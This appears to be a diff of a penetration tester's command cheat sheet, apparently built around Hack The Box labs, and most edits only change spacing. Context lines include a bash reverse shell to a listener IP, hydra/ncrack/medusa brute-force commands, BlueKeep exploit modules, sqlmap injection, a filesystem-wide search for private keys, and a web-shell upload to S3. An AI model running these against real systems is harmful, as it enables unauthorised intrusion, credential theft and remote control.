@@ -62,12 +62,12 @@ exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
 nc -nv 10.129.41.200 7777 - Client Request
 nc -lvnp 7777 - Server Listener
 
-
 HTTPx
 ------------------------------------------------------------
 httpx https://$URL | grep http
 httpx https://$URL --follow-redirects
 httpx -m OPTIONS https://$URL
+
 
 cURL
 ------------------------------------------------------------
@@ -99,18 +99,15 @@ SSH
 hydra -L /usr/share/wordlist/ -p /usr/share/wordlist/ $URL ssh
 hydra -t 16 -L /usr/share/wordlists/ -P /usr/share/wordlists/rockvou.txt -V $URL ssh
 
-
 RPC
----------------------------------------------
+------------------------------------------------------------
 rpcdump -p 111 $URL
 rpcclient -U "" $URL
 
-
 RDP
----------------------------------------------
+------------------------------------------------------------
 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-
 
 SQLMap
 ------------------------------------------------------------
@@ -118,28 +115,25 @@ sqlmap -r sqlfile –dbs --batch
 sqlmap -u $URL --batch
 sqlmap -u $URL/sqli/Less-1/?id=1 --dbs --batch
 
-
 Ncrack
----------------------------------------------
+----------------------------------------------------
 ncrack -U /usr/share/wordlists/ -P /usr/share/wordlists/ http://192.168.0.105
 
-
 Medusa
----------------------------------------------
+-----------------------------------------------------
 medusa -h 192.168.0.105 -U /usr/share/wordlists/ -P /usr/share/wordlists/ -M http -f
 
-
 FTP
----------------------------------------------
+-----------------------------------------------------
 ftp $URL anonymous
 ftp://anonymous:anonymous@$URL
 hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f blog.symbaloo.com ftp
 
-
 IPtables
----------------------------------------------
+-----------------------------------------------------
 iptables -A INPUT -p tcp --dport 22 -j ACCEPT
 iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+
 
 POP3
 ---------------------------------------------
@@ -149,14 +143,12 @@ LDAP
 ---------------------------------------------
 ldapsearch -H ldap://$URL -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
 
-
 Telnet
 ---------------------------------------------
 telnet $URL 80
 GET /HTTP/2
 Host: $URL
 Accept: text/html
-
 
 SSH Keys
 ---------------------------------------------
@@ -165,12 +157,12 @@ cat /root/.ssh/identity.pub
 grep -ir "BEGIN RSA PRIVATE KEY" /*
 
 AWS
----------------------------------------------
+------------------------------------------------
 aws configure
 aws --endpoint=$URL s3 cp shell.php s3://thetoppers.htb
 
 MySQL
----------------------------------------------
+-------------------------------------------------
 mysql -u root -p
 mysql -u root -h docker.hackthebox.eu -P 3306 -p 
 SHOW TABLES
@@ -335,7 +327,6 @@ docker cp sqlfile kali:/
 docker cp kali:/shell.php /Users/luis/Desktop
 docker cp /Users/luis/Desktop/request.txt kali:/usr/share/wordlists
 
-
 cURL
 ---------------------------------------------
 curl -x proxy.domain.com:8080 -U user:password https://reqbin.com
@@ -365,6 +356,7 @@ Nanorc
 curl https://raw.githubusercontent.com/scopatz/nanorc/master/install.sh | sh
 mv $HOME/.nano/* /usr/share/nano/
 
+
 MITM Proxy
 ---------------------------------------------
 sudo mitmproxy
@@ -384,17 +376,21 @@ cp $HOME/.bashrc  /home/linux/.bashrc
 eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
 sudo apt-get install build-essential
 
+
 Brew
 ---------------------------------------------
 sudo chown -R $(whoami) $(brew --prefix)/*
+
 
 SCP
 ---------------------------------------------
 scp /path/to/file username@a
 
+
 FFUF
 ---------------------------------------------
 ffuf -u $URL -w ips.txt -H 'Host: FUZZ' -fs 752
+
 
 IP Generator
 ---------------------------------------------
